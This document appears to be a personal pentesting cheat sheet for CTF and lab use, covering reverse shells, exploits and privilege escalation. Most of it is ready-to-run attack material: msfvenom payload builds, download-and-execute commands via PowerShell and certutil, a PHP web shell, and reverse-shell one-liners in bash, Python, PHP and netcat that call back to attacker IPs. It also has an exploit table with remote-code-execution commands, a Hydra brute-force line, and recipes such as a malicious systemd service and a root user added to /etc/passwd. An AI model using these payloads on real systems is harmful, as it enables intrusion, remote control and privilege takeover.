## Pentest make easy

The purspose of this site is to make the Penetration testing and Privilege escation make easy. There are several exploits and various writeup avilable. But when it is needed its very difficult to find out the exact exploit and the writeup.

In this site I am attempting to collect most of the common exploits that appear in CTF and other exinvornments.

### [SQL Injection](https://dayaramb.github.io/resources/)

### [Getting Revese shell](https://github.com/dayaramb/dayaramb.github.io/tree/master/reverse_shells/README.md)

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
```

```bash
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
```

Once this is running, enter this command to start the reverse shell

```bash
Start-Process "shell-name.exe"
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run
```
### Windows Copy command
```bash 
certutil.exe -urlcache -split -f http://10.10.14.8/winPEAS-x64.exe winPEAS-x64.exe
```

### PHP System Command:
```php
<?php echo(system($_GET["cmd"])); ?>
```
### Reverse shells One liner:

### Bash TCP

```bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
```

### Bash UDP

```bash
Victim:
sh -i >& /dev/udp/10.0.0.1/4242 0>&1

Listener:
nc -u -lvp 4242
```

Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash



### Python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```

### php
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/443 0>&1'");
```
### netcat OpenBSD

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

## References

* [Reverse Bash Shell One Liner](https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner)
* [Pentest Monkey - Cheat Sheet Reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [Spawning a TTY Shell](http://netsec.ws/?p=337)
* [Obtaining a fully interactive shell](https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell)
### [Reverse Shell Collection](https://github.com/dayaramb/pentest-tools/tree/master/reverse_shells)



## Enumerations
### DNS
if the port 53 is open try to find  if there are some name resolved. /etc/resolv.conf ---> victim IP

dig -x <victim-ip>

Eg. dig cronos.htb any
For whole zone tranasfer dig axfr @10.10.10.13 cronos.htb

## Random Exploit collection

Here I am collectign some of the random exploits and their exploitation technqiues. Later I will categorised and group them to each group.

|s.no| Application Name | Vulnerability | Scenario | Working Exploits | Reverse Shell | Writeup and Reference |
| --- | --- | --- | --- | --- | --- | --- |
|1.| Jenkins  | default username and pass |Running in Windows | [Nishang](https://github.com/samratashok/nishang) to gain initial access.| Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it:```powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port``` You first need to download the Powershell script, and make it available for the server to download. You can do this by creating a http server with python: python3 -m http.server|[jenkis writeup](https://executeatwill.com/2020/04/01/TryHackMe-Alfred-Walkthrough/) |
| 2.|ThinVNC  1.0b1  | Authentication Bypass CVE-2019-17662 | VNC running in port 3389 and can be exploited using password lookup, can be accessed using Browser|[Exploit 47519](https://www.exploit-db.com/exploits/47519). Simply using Burp suite also reveals the password here as well.  |to get reverse shell first get the password of admin user and then login. After you can use nc.exe to connect to the Kali. |[Video](https://www.youtube.com/watch?v=uNll_EYri0A)|
|3.|Haraka SMTP < 2.8.9 |Remote Command Execution |runing in different port than 25 in Linux |[Exploit 41162](https://www.exploit-db.com/exploits/41162) only need to change the port |```python 41162.py -c "php -r '\$sock=fsockopen(\"192.168.100.1\",443);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" -t root@haraka.test -m 192.168.200.1``` or bash method.  |[Similar HTB writeup](https://0xdf.gitlab.io/2019/04/13/htb-redcross.html)|
|4.|BlogEngine 3.3.6.0|Authentication Bypass & Directory Traversal [CVE-2019-6714](https://nvd.nist.gov/vuln/detail/CVE-2019-6714)|Need to guess the password using Hydra "hydra -l \<username> -P /usr/share/wordlists/\<wordlist> \<ip> http-post-form" Most of the command consists of the string after “http-post-form”. This string has three parts divided by colons — “path to the login form page : request body : error message indicating failure” use burp suite to get all the details.|Login using the admin and brute forced pass. Get the verison of BlogEngine You have to upload the file  PostView.ascx to access the shell. Follow the exploit [46353](https://www.exploit-db.com/exploits/46353)| Modify the exploit to have ip. | [Writeup](https://medium.com/@nickbhe/tryhackme-hackpark-writeup-db34b7957bef)|
|5. |PHP log poisoning | https://www.hackingarticles.in/apache-log-poisoning-through-lfi/ | https://0xdf.gitlab.io/2018/09/08/htb-poison.html | --- | --- | --- |
|6.|IIS6.0 | [Zero day exploit to get reverse shell](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell) |- |- |-|
|7.|Drupal7.x|7.x Module Services - Remote Code Execution           | php/webapps/41564.php |- | - |change the urllink, change the system command so you can execute cmd and change to rest |



## Linux Privilege Escalation

#### SUID /bin/systemctl
create revshell.service as:
```bash
revshell.service
[Service]
Type=oneshot
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.2.26.129/4444 0>&1"
[Install]
WantedBy=multi-user.target

```
#### systemctl
```bash
systemctl link /tmp/revshell.service
Created symlink from /etc/systemd/system/revshell.service to /tmp/revshell.service.
$ systemctl enable --now /tmp/daya.service
Created symlink from /etc/systemd/system/multi-user.target.wants/revshell.service to /tmp/revshell.service.
Job for daya.service failed because the control process exited with error code. See "systemctl status revshell.service" and "journalctl -xe" for details.

systemctl start revshell.service

```
After it runs successfully you will get reverse shell back to kali.

### /etc/passwd world writable
* Simply appending in /etc/passwd and making the UID 0 will provide you the root access to system. 
* Generate the password:  perl -le 'print crypt("foo", "aa")'
to set the password to foo.
* daya:aaKNIEDOaueR6:0:0:daya:/tmp/daya:/bin/bash
### Useful Commands:
msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=[your_ip] LPORT=[listening_port] -f exe -o [shell_name.exe]

certutil.exe -urlcache -split -f http://10.2.26.129/winPEAS-x64.exe winPEAS-x64.exe

certutil.exe -urlcache -split -f http://10.2.26.129/shell.exe shell.exe


### Cron job running by root.
Eg. * * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1

In this case you can simply replace the /var/www/laravel/artisan file with one liner php reverse shell.

## Windows Privilege Escalation
The ultimate goal is to gain a shell running as administrator or system users. Windows privilege escalations can be simple(eg. a kernel exploits) or require a lot of reconnaissance on the compromised system. 
In lot of cases it may not rely on a single misconfigurations, but may require you to think and combine multiple configurations. 

## General Conecpts:
All privilege esclations are effectively exmaples of a access control violations. Access control and user permission are intrinsically linked. When focusing on privilege escalations in windows, understanding how windows handles permission is very important. 

## Permission in windows. 
Two types of Account: 
User account: Administrator and general account. 
Service account: Used for running services in windows system. System account is the default service account which has highest privileges. Other default service account includes NETWORK SERVICE and LOCAL SERVICE. 

## Groups

User accounts can belong to multiple groups, and groups can have multipel users. 
Groups allow easier access control to resources.
Reular groups(eg. administrator, Users) have a list of members. 

Pseudo groups (eg. "Authenticated Users) have a dynamic list of members which changes based on certain interactions. 

## Resource
In windows there are multiple types of resoure (also known as objects):
** Files/Directories.
** Registry Entries
** Services
Whether a user and or/group has a permission to perform a certain action on a resource depends on that resossurce's ACL(access control list)

## ACL & ACE
Permissions to access a certain resource in Winndows are controlled by the access control list (ACL). Each ACL is made up of zero or more access control entries. (ACEs)

Each ACE defines the relationship between a principal (eg. a user,group) adn a certain access right. 


## Tools
### Powerup and Sharpup
They are similar tools to hunt for specific privilege escalations.
```bash
powershell -exec bypass
.\powerup.ps1
-Invoke-Allchecks
```
### sharup (Binary)
.\sharup
### winpeas

Before running, we need to add a registry key and then reopen the command prompt:
* reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
Run all checks while avoiding time-consuming searches:
* .\winPEASany.exe quiet cmd fast
Run specific check categories:
* .\winPEASany.exe quiet cmd systeminfo

### Kernel Exploits:
python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | le


Best tool. 
winpeash -h


## Services
Services are simply programs that run in the background, accepting input or performing regular tasks. 
If services run with SYSTEM privileges and are misconfigured, exploiting them may lead to the command execution with SYSTEM privileges as well. 

## Service Command
Query the configuration of a service:
* sc.exe qc <name>
Query the current status of a service:
* sc.exe query <name>
Modify a configuration option of a service:
* sc.exe config <name> <option>= <value>
Start/Stop a service:
* net start/stop <name>

### accesschk




### Iperius Backup 6.1.0 - Privilege Escalation
Scenario: On a VNC accessible machine this service is running. Use the exploit [46863](https://www.exploit-db.com/exploits/46863) in exploitdb.

### SystemScheduler
Inside c:\Program Files (x86)\SystemScheduler we can found a list of application scheduled. It is observed that details logs in c:\Program Files (x86)\SystemScheduler/events. 08/29/2020  07:15 AM            16,107 20198415519.INI_LOG.txt Here in this scenario, message.exe we can overwrite it. Possible DLL hijacking. Create shell.exe and overwrite message.exe with shell.exe. You will get admin reverse shell.

### Jekyll Themes

Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/dayaramb/dayaramb.github.io/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.

### Support or Contact

Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
